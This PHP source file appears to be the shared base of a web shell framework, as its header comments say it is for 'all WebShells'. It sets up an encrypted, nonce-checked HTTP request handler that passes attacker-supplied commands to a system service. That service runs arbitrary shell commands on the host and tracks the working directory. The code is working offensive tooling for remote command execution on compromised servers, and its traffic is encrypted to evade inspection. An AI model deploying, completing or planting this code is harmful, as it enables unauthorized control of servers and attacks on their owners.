<?php

//////////////////////////////////////////////////////////////////////////////
// Base classes, variables and other required definitions for all WebShells //
//////////////////////////////////////////////////////////////////////////////

// Start or resume the session
session_Start();

// Initialize variables
$steps = [];
$actions = [];

// Add Required Base classes

interface Action
{
    public function run($args);
}

class Bootstrapper
{
    private $steps;

    public function __construct($steps)
    {
        $this->steps = $steps;
    }

    public function launch()
    {
        // Run all initialization steps
        foreach ($this->steps as $step) {
            $step->run();
        }
    }
}

class Request
{
    private $source;
    private $action;
    private $args;
    private $nonce;

    public function __construct(
        $source = null,
        $action = null,
        $args = null,
        $nonce = null
    )
    {
        $this->source = $source;
        $this->action = $action;
        $this->args = $args;
        $this->nonce = $nonce;
    }

    public function isValid()
    {
        return !(is_null($this->action) || is_null($this->args));
    }

    public function getSource()
    {
        return $this->source;
    }


    public function getAction()
    {
        return $this->action;
    }

    public function getArgs()
    {
        return $this->args;
    }

    public function getNonce()
    {
        return $this->nonce;
    }
}

class RequestHandler extends Singleton
{
    private $actions = [];

    public function addAction($key, $action)
    {
        $this->actions[$key] = $action;
    }

    public function handle()
    {
        // Prepare request object
        $request = $this->unpackRequest();

        // Validate the request and decrypt body
        $body = null;

        if ($this->validateRequest($request)) {
            // Process the request
            [
                'code' => $code,
                'body' => $body
            ] = $this->processRequest($request);

        } else {
            // Set 403 status code 
            $code = 403;
        }

        // Build the response
        return $this->buildResponse($code, $body);
    }

    private function unpackRequest()
    {
        // Get request body
        $payload = json_decode(file_get_contents('php://input'));

        // Decrypt request body
        $iv = base64_decode($payload->iv);
        $encryptedBody = $payload->body;
        $jsonBody = SecurityService::getInstance()->decrypt($encryptedBody, $iv);

        // If the body cannot be decripted, return empty request. Otherwise, populate its values
        if ($jsonBody !== '') {
            $body = json_decode($jsonBody);
            $request = new Request(
                $_SERVER['REMOTE_ADDR'],
                property_exists($body, 'action') ? $body->action : null,
                property_exists($body, 'args') ? $body->args : null,
                property_exists($body, 'nonce') ? $body->nonce : null
            );
        } else {
            $request = new Request();
        }

        return $request;
    }

    private function validateRequest($request)
    {
        return SecurityService::getInstance()->validate($request);
    }

    private function processRequest($request)
    {
        // Declare an empty response
        $body = null;

        // Attempt to handle the action. If an error occurs, set status code 500
        try {
            // Check if there is an appropriate handler configured
            if (array_key_exists($request->getAction(), $this->actions)) {
                // Call the appropriate action
                $body = [];
                $body['output'] = $this->actions[$request->getAction()]->run($request->getArgs());
                $code = 200;
            } else {
                $code = 404;
            }
        } catch (\Exception $e) {
            $code = 500;
        }

        return [
            'code' => $code,
            'body' => $body,
        ];
    }

    private function buildResponse($code, $body = null)
    {
        // Initialize variables
        $response = null;
        $securityService = SecurityService::getInstance();

        // Set the Content-Type header
        header('Content-Type: application/json');

        // Set the response code
        http_response_code($code);

        // If a body is supplied, add the nonce, if not, create a body with the nonce
        if (!is_null($body)) {
            $body['nonce'] = $securityService->getNonce();
        } else {
            $body = [ 'nonce' => $securityService->getNonce() ];
        }

        // Encrypt the body and build the response
        $encryptedBody = $securityService->encrypt(json_encode($body));
        $response = json_encode($encryptedBody);

        // Return the response
        return $response;
    }
}

class SecurityService extends Singleton
{
    private $key;
    private $validators = [];

    public function encrypt($body)
    {
        // Generate an initialization vector for the encryption process
        $iv = random_bytes(16);
        $body = openssl_encrypt($body, 'aes-256-cbc', $this->key, 0, $iv);

        // Return both the encrypted body and the initialization vector
        return [
            'body' => $body,
            'iv' => base64_encode($iv)
        ];
    }

    public function decrypt($body, $iv)
    {
        return openssl_decrypt($body, 'aes-256-cbc', $this->key, 0, $iv); 
    }

    public function validate($request)
    {
        // Check if the request was successfully decrypted
        $valid = $request->isValid();

        // Pass the request to all configured validators to test if it meets the security criteria
        for ($i = 0; $i < count($this->validators) && $valid; $i++) {
            $valid &= $this->validators[$i]->validate($request);
        }

        // Return the result
        return $valid;
    }

    public function addValidator($validator)
    {
        array_push($this->validators, $validator);
    }

    public function getNonce()
    {
        // Initialize emtpy nonce
        $nonce = '';

        // If a nonce has been set, return it
        if (isset($_SESSION['nonce'])) {
            $nonce = $_SESSION['nonce'];
        }

        return $nonce;
    }

    public function setKey($key)
    {
        $this->key = $key;
    }

    public function setNonce($nonce)
    {
        $_SESSION['nonce'] = $nonce;
    }
}

class SetupEncryptionStep implements Step
{
    private $key;

    public function __construct($key)
    {
        $this->key = $key;
    }

    public function run()
    {
        // Configure the SecurityService 
        SecurityService::getInstance()->setKey($this->key);
    }
}


class SetupRequestHandlerStep implements Step
{
    private $actions;

    public function __construct($actions)
    {
        $this->actions = $actions;
    }

    public function run()
    {
        // Get the requestHandler instance
        $requestHandler = RequestHandler::getInstance();

        // Add the actions to the handler
        foreach (array_keys($this->actions) as $key) {
            $requestHandler->addAction($key, $this->actions[$key]);
        }
    }
}

abstract class Singleton
{

    private static $instances = [];

    // Singleton instances cannot be instantiated using `new`, cloned or deserialized
    protected function __construct() { }
    protected function __clone() { }
    public function __wakeup()
    {
        throw new \Exception('Cannot unserialize a singleton');
    }

    public static function getInstance()
    {
        // If there is not an instance registered for the concrete subclass, register it
        $cls = static::class;
        if (!isset(self::$instances[$cls])) {
            self::$instances[$cls] = new static();
        }

        // Return the instance corresponding to the subclass
        return static::$instances[$cls];
    }
}

interface Step
{
    public function run();
}

class SystemService extends Singleton
{
    // Class attributes
    private $executionMethod = null;
    
    public function execute($cmd)
    {
        $output = '';

        // If it is a `cd` command, update the current dir. Else, run the command
        if(str_starts_with($cmd, 'cd ')) {
            $output = $this->handleCDCommand($cmd);
        } else {
            // If the cwd has been updated at any time, append a cd to the command
            $currentDir = (array_key_exists('cwd', $_SESSION)) ? $_SESSION['cwd'] : '';
            $preparedCommand = ($currentDir == '') ? $cmd : 'cd ' . $currentDir . ' && ' . $cmd;

            // Run the command
            $output = $this->executionMethod->execute($preparedCommand);
        }

        return $output;
    }

    public function setExecutionMethod($executionMethod)
    {
        $this->executionMethod = $executionMethod;
    }

    public function getCurrentDir()
    {
        $currentDir = '';

        // If no current dir is stored, run a `pwd` command. Else, return the stored dir
        if(!array_key_exists('cwd', $_SESSION)) {
            $currentDir = rtrim($this->executionMethod->execute('pwd'));
        } else {
            $currentDir = $_SESSION['cwd'];
        }

        return $currentDir;
    }

    private function handleCDCommand($cmd)
    {
        // If the command fails, return current directory
        $output = $this->getCurrentDir();

        // Get the target directory
        $targetDir = substr($cmd, 3, strlen($cmd) - 3);

        // Check if the path is relative and if so, append it to the current path
        if ($targetDir[0] !== '/') {
            $targetDir = $this->getCurrentDir() . '/' . $targetDir;
        }

        if (is_dir($targetDir)) {
            $_SESSION['cwd'] = $targetDir;
            $output = $targetDir;
        }

        return $output;
    }
}

interface Validator
{
    public function validate($request);
}

/////////////////////////////////////////////////////////////////////////
// Base configuration required for all WebShells regardless of actions //
/////////////////////////////////////////////////////////////////////////

$key = hex2bin('KEY');
array_push($steps, new SetupEncryptionStep($key));

